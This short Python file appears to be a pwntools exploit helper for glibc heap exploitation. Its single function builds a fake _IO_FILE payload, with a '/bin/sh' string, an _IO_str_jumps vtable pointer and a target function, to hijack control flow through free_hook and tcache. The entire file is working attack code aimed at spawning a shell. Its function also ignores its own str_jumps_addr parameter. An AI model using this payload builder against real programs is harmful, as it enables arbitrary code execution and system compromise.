from pwn import * 
from base_data import *

def HOP(fake_IO_FILE_addr, str_jumps_addr, tcache_size, fun, param=None):
    '''
        fake_IO_FILE_addr: 伪造的_IO_FILE结构体地址
        str_jumps_addr: _IO_str_jumps地址
        tcache_size: tcache bin中的chunk大小, 需要大于102
        fun: 调用的函数
        param: 该函数的参数, 默认使用内置binsh
        
        要求:必须将free_hook-0x18放入tcache bin中
    '''
    
    if param is None: # 使用内置binsh
        param = fake_IO_FILE_addr + 0x60
        
    payload = b''
    payload = set_value(payload, 0x40, param + int((tcache_size - 100) / 2))
    payload = set_value(payload, 0x38, param)
    payload = set_value(payload, 0x28, param + tcache_size - 100)
    payload = set_value(payload, 0x20, 0)
    
    payload = set_value(payload, 0x60, BINSH)
    payload = set_value(payload, 0x78, fun)

    payload = set_value(payload, 0xD8, str_jumps)
    
    return payload